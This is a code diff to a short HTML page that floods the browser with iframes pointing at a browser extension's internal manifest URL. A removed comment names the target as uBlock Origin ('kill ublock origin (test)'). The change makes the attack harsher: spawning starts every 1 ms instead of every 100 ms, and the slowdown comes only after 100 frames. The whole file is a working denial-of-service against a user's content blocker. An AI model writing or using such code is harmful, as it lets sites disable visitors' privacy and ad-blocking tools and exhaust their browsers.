@@ -3,41 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IFrame Spawner</title>
+    <title>Iframe Spawner</title>
     <style>
+        button {
+            margin: 20px;
+        }
         iframe {
             width: 200px;
             height: 150px;
-            border: 1px solid black;
-            margin: 5px;
+            margin: 10px;
+            display: inline-block;
         }
     </style>
 </head>
 <body>
-    <button id="start">Start Spawning IFrames</button>
-    <div id="container"></div>
+    <button id="start">Start Spawning Iframes</button>
+    <div id="iframe-container"></div> <!-- Container to hold the iframes -->
 
     <script>
-        let interval = 100; // Start with 100 ms
+        let interval = 1; // Start with 1 ms
         let count = 0;
 
         document.getElementById('start').addEventListener('click', function() {
-            const container = document.getElementById('container');
-            const spawnIFrames = () => {
-                const iframe = document.createElement('iframe');
-                iframe.src = "chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/manifest.json"; //kill ublock origin (test)
-                container.appendChild(iframe);
+            const spawnIframes = () => {
+                // Create a new iframe element
+                const newIframe = document.createElement("iframe");
+                newIframe.src = "chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/manifest.json";
+                
+                // Append the iframe to the container in the same window
+                document.getElementById("iframe-container").appendChild(newIframe);
+
                 count++;
 
-                if (count >= 10) { // After 10 iframes, slow down
+                if (count >= 100) { // After 10 iframes, slow down
                     count = 0; // Reset count
-                    interval += 100; // Increase delay
+                    interval += 1; // Increase delay
                 }
 
-                setTimeout(spawnIFrames, interval);
+                // Continue spawning with the new interval
+                setTimeout(spawnIframes, interval);
             };
 
-            spawnIFrames(); // Start the spawning
+            spawnIframes(); // Start the spawning
         });
     </script>
 </body>
